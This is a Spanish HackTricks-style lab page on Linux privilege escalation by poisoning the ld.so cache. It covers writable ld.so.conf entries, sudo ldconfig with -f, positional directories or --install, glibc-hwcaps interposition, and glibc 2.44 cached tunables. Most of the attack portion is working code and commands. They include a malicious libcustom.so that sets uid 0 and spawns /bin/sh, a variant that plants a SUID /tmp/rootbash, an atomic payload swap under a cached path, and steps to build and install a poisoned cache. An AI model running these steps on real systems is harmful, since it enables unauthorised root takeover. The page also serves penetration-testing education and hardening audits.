# Ejemplo de exploit de privesc de ld.so

{{#include ../../banners/hacktricks-training.md}}

Esta página es un laboratorio centrado en el envenenamiento de la **caché del linker del sistema mediante `/etc/ld.so.conf` o `ldconfig`**. Para la inyección de librerías faltantes, `RPATH`/`RUNPATH` modificables, `LD_PRELOAD` y otros abusos genéricos del linker SUID, consulta [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Preparar el entorno

En la siguiente sección puedes encontrar el código de los archivos que vamos a utilizar para preparar el entorno.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crea** esos archivos en tu máquina, en la misma carpeta
2. **Compila** la **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` a `/usr/lib` y actualiza la caché: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilegios de root)
4. **Compila** el **ejecutable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Comprueba el entorno

Comprueba que _libcustom.so_ se está **cargando** desde _/usr/lib_ y que puedes **ejecutar** el binario.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandos útiles de triage

Al atacar un objetivo real, verifica el **nombre exacto de la library** que necesita el binario, qué está **resolviendo actualmente el loader** y qué rutas configuradas se pueden escribir sin modificar el cache activo.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Usa `ldd` únicamente en un ejecutable **trusted**. Algunas implementaciones o intérpretes ELF inusuales pueden hacer que ejecute código controlado por un atacante; `objdump -p ./file | grep NEEDED` muestra de forma segura las dependencias directas. Para un objetivo trusted, invocar el intérprete descubierto con `--list` muestra la resolución real. Compara esa salida con `--inhibit-cache --list`: una diferencia demuestra que `/etc/ld.so.cache`, en lugar de una regla ordinaria de search-path, seleccionó el objeto.<sup>[[1]](#references)[[4]](#references)</sup>

Un par de trampas útiles:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` normalmente **no funciona** porque la redirección la realiza tu shell actual. Usa
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` en su lugar.
- Los binarios **SUID/privileged** se ejecutan en **secure-execution mode**: `LD_LIBRARY_PATH`
se ignora, mientras que `LD_PRELOAD` está restringido (los nombres que contienen barras se
ignoran, y solo se pueden preloadear libraries marcadas como setuid en directorios estándar). Una vez que root ejecuta `ldconfig`, los directorios listados en
`/etc/ld.so.conf` pueden entrar en `/etc/ld.so.cache`, por lo que esta misconfiguration aún puede
afectar a programas privileged.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` también se ignora en secure-execution mode a menos que exista `/etc/suid-debug`, así que recopila su trace desde una ejecución no-SUID equivalente en lugar de esperar una salida de la ejecución privileged.<sup>[[1]](#references)</sup>
- En glibc 2.33 y posteriores, el dynamic loader también expone
`--list-diagnostics`, que muestra diagnósticos del loader legibles por máquinas e información sobre search-paths integrados cuando un hijack no se comporta como se esperaba.<sup>[[1]](#references)[[6]](#references)</sup>

### Restricciones de Cache y SONAME

`ldconfig` no almacena en cache cualquier archivo arbitrario de un directorio configurado: examina las cabeceras ELF, reconoce nombres que coinciden con `lib*.so*` o `ld-*.so*`, y espera la cadena convencional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Por tanto, el objeto inyectado debe tener la arquitectura/clase del objetivo, el nombre exacto de `DT_NEEDED` (normalmente su `DT_SONAME`) y cualquier símbolo/versión que resuelva la víctima.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefiere una library específica para el target, como en este ejemplo. Hacer shadowing de un SONAME común con un objeto incompleto puede romper todos los procesos que lo resuelvan antes de que se ejecute el target privilegiado.<sup>[[3]](#references)</sup>

### Persistencia de rutas en caché e intercambios atómicos

La caché registra una asignación de **nombre de library a ruta**; no incluye el shared object. Después de que se almacena en caché una ruta controlada por el atacante, reemplazar el objeto en esa ruta exacta afecta a los procesos iniciados posteriormente sin otra ejecución de `ldconfig`. Esto permite un patrón útil de time-of-check/time-of-use: exponer una library válida durante la reconstrucción o inspección de la caché por parte de un administrador y, a continuación, renombrar atómicamente el payload sobre ella. Los procesos existentes conservan el objeto que ya tienen mapeado.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Asimismo, eliminar la línea maliciosa de `ld.so.conf` no expulsa por sí solo una entrada ya escrita: el administrador debe eliminar el objeto no confiable, corregir la propiedad y el acceso de escritura, y reconstruir la caché. Usa la comparación `--inhibit-cache` anterior para distinguir una entrada obsoleta de la caché de una ruta de configuración aún activa.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

En este escenario, supongamos que un administrador ha añadido una entrada vulnerable a un
archivo bajo `/etc/ld.so.conf.d/` que está incluido por el
`/etc/ld.so.conf` del sistema.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
La carpeta vulnerable es _/home/ubuntu/lib_ (donde tenemos acceso de escritura).\
**Descarga y compila** el siguiente código dentro de esa ruta:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Si esperas que **root** (u otra cuenta con privilegios) ejecute posteriormente el binario vulnerable, normalmente es mejor dejar un **artefacto propiedad de root** en lugar de iniciar una shell interactiva. Por ejemplo:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Después de que se produzca la ejecución con privilegios, puedes usar `/tmp/rootbash -p`.

Ahora que hemos **creado la biblioteca maliciosa libcustom dentro de la ruta mal configurada**, la caché predeterminada debe reconstruirse mediante una ejecución exitosa de **`ldconfig`** con privilegios. Un reinicio solo ayuda cuando el proceso de arranque local realmente lo invoca; de lo contrario, espera a que un administrador realice la acción o utiliza una regla de sudo insegura si hay alguna disponible.<sup>[[2]](#references)</sup>

Una vez hecho esto, **vuelve a comprobar** desde dónde el ejecutable `sharedvuln` está cargando la biblioteca `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como puedes ver, lo está **cargando desde `/home/ubuntu/lib`** y, si cualquier usuario lo ejecuta, se ejecutará un shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Ten en cuenta que en este ejemplo no hemos escalado privilegios, pero modificando los comandos ejecutados y **esperando a que root u otro usuario privilegiado ejecute el binario vulnerable**, podremos escalar privilegios.

### Interposición de `glibc-hwcaps`

Desde glibc 2.33, el loader puede preferir bibliotecas optimizadas dentro de `glibc-hwcaps/<level>/` en **cada directorio de búsqueda de bibliotecas**. Por lo tanto, comprobar únicamente `/home/ubuntu/lib` es insuficiente: un subdirectorio compatible con permisos de escritura, como `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, puede ocultar la biblioteca base después de que `ldconfig` la indexe, mientras que otras CPU siguen utilizando el objeto base. Esto también proporciona un hijacking selectivo por arquitectura que puede pasar desapercibido cuando la validación se realiza en una CPU diferente.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
La guía actual de hardening de glibc recomienda evitar SONAMEs duplicados, ubicaciones de búsqueda no predeterminadas y objetos en subdirectorios de `glibc-hwcaps`. Desde la perspectiva de una auditoría, aplica recursivamente comprobaciones de ownership y writeability a los directorios configurados y a sus componentes de ruta principales.<sup>[[3]](#references)</sup>

### Otras configuraciones incorrectas - Misma vuln

En el ejemplo anterior, simulamos una configuración incorrecta en la que un administrador **estableció una carpeta no privilegiada dentro de un archivo de configuración en `/etc/ld.so.conf.d/`**.\
Pero hay otras configuraciones incorrectas que pueden causar la misma vulnerabilidad: si tienes **permisos de escritura** en un **archivo de configuración** cargado, puedes crear un archivo en un directorio `/etc/ld.so.conf.d/` con permisos de escritura o puedes escribir en `/etc/ld.so.conf`, puedes configurar y explotar la misma vulnerabilidad.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Supón que tienes privilegios de sudo sobre `ldconfig`**. `ldconfig` acepta directorios de búsqueda como argumentos posicionales, por lo que la forma más corta de envenenamiento de la caché suele ser simplemente:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Alternativamente, `-f` selecciona otro archivo de configuración mientras conserva la salida de caché predeterminada. Esto resulta útil cuando un filtro de argumentos bloquea los directorios posicionales, pero aún permite `-f`, o cuando se deben inyectar varias rutas:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ahora, como se indica en el **exploit anterior**, **crea la biblioteca maliciosa dentro de `/tmp`**.\
Y finalmente, carguemos la ruta y comprobemos desde dónde está el binario cargando la biblioteca:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como puedes ver, al tener privilegios de sudo sobre `ldconfig` puedes explotar la misma vulnerabilidad.** Los detalles de las opciones son importantes al evaluar una regla de sudo restringida: `-f` selecciona otra configuración, pero aún reconstruye `/etc/ld.so.cache`; `-C` redirige la caché a otra ubicación; `-N` impide reconstruir la caché; y `-X` impide actualizar los enlaces, pero **aún reconstruye la caché a menos que se combine con `-N`**. `-n` implica `-N`, por lo que puede actualizar enlaces en los directorios proporcionados, pero no puede envenenar la caché; `-r` opera por debajo de una raíz alternativa y normalmente no modifica la caché del host.<sup>[[2]](#references)</sup>

### glibc 2.44: instalar una caché precompilada

Glibc 2.44 añadió `ldconfig --install SOURCE`, que copia atómicamente una caché precompilada al destino de caché seleccionado (la caché `/etc/ld.so.cache` del host, a menos que `-C` o `-r` lo cambien). Esto crea otro argumento peligroso para las reglas de sudoers y los wrappers privilegiados: un atacante puede construir una caché válida **sin privilegios** y luego utilizar la invocación permitida de `--install` para reemplazar la caché del sistema. La ruta de instalación comprueba el magic de la caché, pero no vuelve a generar sus entradas a partir de una configuración confiable.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
La caché todavía contiene **nombres de ruta**, no bytes de la biblioteca, por lo que `/tmp/libcustom.so` debe seguir presente y ser compatible cuando se inicie la víctima. Por tanto, los filtros que simplemente rechazan `-f`, los directorios posicionales o `-t` están incompletos en glibc 2.44: también deben rechazar `--install`/`-I` o, preferiblemente, no delegar `ldconfig` en absoluto.<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: ajustes almacenados en caché para todo el sistema

A partir de glibc 2.44, `ldconfig` también analiza `/etc/tunables.conf` y almacena sus ajustes como una extensión en `/etc/ld.so.cache`. El archivo acepta directivas `include` y filtros por proceso. Los prefijos controlan el ámbito: `@`/`onlysecure` se dirige únicamente a procesos `AT_SECURE`, `$`/`nonsecure` excluye esos procesos y `*`/`anysecure` abarca ambos. **Una entrada sin prefijo se aplica de forma predeterminada a procesos no seguros**, por lo que un atacante debe usar explícitamente `@` o `*` para influir en programas setuid, setgid o elevados mediante capabilities. Esto amplía el límite de auditoría más allá de los directorios de bibliotecas: una configuración de tunables escribible o un archivo incluido puede influir en futuros inicios de programas después de una reconstrucción privilegiada de la caché.<sup>[[7]](#references)[[9]](#references)</sup>

La misma versión añade `ldconfig -t TUNCONF`, que selecciona un archivo de tunables alternativo y, aun así, escribe la caché normal, a menos que otra opción la modifique. Por tanto, los wrappers y las reglas de sudo que intentaban bloquear únicamente `-f` también deben rechazar `-t`, los directorios posicionales arbitrarios, `--install` y la manipulación de la salida de la caché.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### Ajustes específicos para el objetivo

El filtro `[proc:PATTERN]` aplica las siguientes entradas únicamente cuando la ruta completa `/proc/self/exe` del ejecutable (si `PATTERN` comienza por `/`) o su nombre base coincide. Un filtro termina en el siguiente filtro, `[]`, el final del archivo o el límite de un archivo incluido. Esto hace que un caché envenenado sea menos ruidoso, ya que el comportamiento alterado puede restringirse a una única víctima privilegiada.<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
El prefijo `-`/`nonoverridable` impide que `GLIBC_TUNABLES` sobrescriba un valor almacenado en caché; `+`/`overridable` restaura el comportamiento normal de sobrescritura. En los procesos `AT_SECURE`, la variable de entorno se ignora por completo de todos modos. Trata el formato del archivo como específico de la versión: el proyecto glibc no lo garantiza como una interfaz estable, y enumera los nombres y valores compatibles con `"$interp" --list-tunables` antes de intentar un efecto específico.<sup>[[7]](#references)[[9]](#references)</sup>

Esto no implica automáticamente la ejecución de código arbitrario. Es una primitiva privilegiada de **loader-behavior manipulation**: glibc advierte explícitamente que los valores de todo el sistema pueden aplicar tunables sensibles para la seguridad a programas setuid/setgid sin una comprobación de seguridad por tunable. Busca cambios específicos del allocator objetivo, cambios de hardening de la CPU o condiciones de denegación de servicio, en lugar de asumir un payload universal.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening del enlazador dinámico - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - página del manual de Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnósticos del enlazador dinámico (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Tunables de todo el sistema (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Añadir tunables de todo el sistema: parte de ldconfig (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [The GNU C Library versión 2.44 ya está disponible](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [Código fuente de glibc 2.44 ldconfig](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
